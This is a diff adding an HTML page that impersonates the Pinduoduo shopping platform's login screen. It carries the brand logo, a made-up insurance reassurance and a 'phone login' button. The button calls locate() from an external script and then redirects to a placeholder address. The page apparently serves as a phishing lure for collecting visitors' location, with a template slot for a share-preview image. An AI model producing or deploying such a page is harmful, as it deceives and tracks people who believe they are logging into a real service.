@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="ch-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:image" content="$IMG_URL$">
+    <title>拼多多登录</title>
+    <script type="text/javascript">
+        if (window.location.protocol == "http:") {
+            var restOfUrl = window.location.href.substr(5);
+            
+        }
+    </script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <script type="text/javascript" src="js/location.js"></script>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .header {
+            text-align: center;
+            margin: 40px 0;
+        }
+        
+        .header1 {
+            text-align: center;
+            margin: 40px 0;
+            color: #e4c51a;
+        }
+        
+        .title {
+            color: #e02b41;
+            font-size: 32px;
+            font-weight: bold;
+        }
+        
+        .subtitle {
+            text-align: center;
+            color: #333;
+            font-size: 24px;
+            margin: 30px 0;
+        }
+        
+        .insurance {
+            text-align: center;
+            color: #999;
+            font-size: 12px;
+            margin-top: 40px;
+            line-height: 1.5;
+        }
+        
+        .button-container {
+            text-align: center;
+            margin: 30px 0;
+        }
+        /* 自定义按钮样式 */
+        
+        .jfk-button {
+            padding: 12px 100px;
+            border-radius: 4px;
+            font-size: 20px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .jfk-button-action {
+            background-color: #e4c51a;
+            color: white;
+            border: none;
+        }
+        
+        .jfk-button-action:hover {
+            background-color: #c82333;
+        }
+    </style>
+</head>
+
+<body onload="information();">
+    <div class="header">
+        <img src="./pdd.png" alt="拼多多">
+    </div>
+
+    <div class="button-container">
+        <button id="requestButton" style="font-weight:bold" class="jfk-button jfk-button-action" onclick="locate(function(){window.location='eee.eee.eee';}, function(){$('#change').html('Failed');});">手机登录</button>
+    </div>
+    <p class="insurance">
+        ● 平台用户信息安全由中国人保财险承保
+    </p>
+    <div id="error-message" style="color: red; text-align: center; margin-top: 10px;"></div>
+</body>
+
+</html>
